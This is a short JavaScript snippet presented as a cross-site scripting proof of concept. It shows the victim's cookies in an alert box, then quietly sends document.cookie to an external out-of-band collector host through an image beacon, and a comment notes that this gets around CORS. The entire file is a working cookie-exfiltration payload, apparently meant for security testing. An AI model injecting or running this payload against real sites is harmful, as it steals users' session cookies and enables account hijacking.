(() => {
  // Visible proof (you can remove this)
  alert("XSS PoC — cookies: " + document.cookie);

  // Beacon to your collector (works cross-origin, no CORS needed)
  const img = new Image();
  img.src = "https://d2s76e606iujt76hkdt0udhdpugmsadax.oast.pro/collect?c=" +
            encodeURIComponent(document.cookie || "");
})();
